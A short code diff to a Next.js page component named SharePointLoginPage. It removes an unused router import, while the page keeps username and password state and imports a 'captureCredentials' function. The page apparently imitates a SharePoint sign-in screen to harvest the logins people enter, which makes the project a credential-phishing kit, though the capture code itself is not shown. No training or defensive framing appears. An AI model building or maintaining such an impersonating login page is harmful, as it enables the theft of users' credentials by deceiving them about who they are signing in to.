@@ -1,6 +1,5 @@
 'use client';
 import { FormEvent, useState } from 'react';
-import { useRouter } from 'next/navigation';
 import { captureCredentials } from '@/ai/flows/capture-credentials';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
@@ -22,7 +21,6 @@ export default function SharePointLoginPage() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showAlert, setShowAlert] = useState(false);
-  const router = useRouter();
   const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');
 
   const handleSubmit = async (event: FormEvent) => {
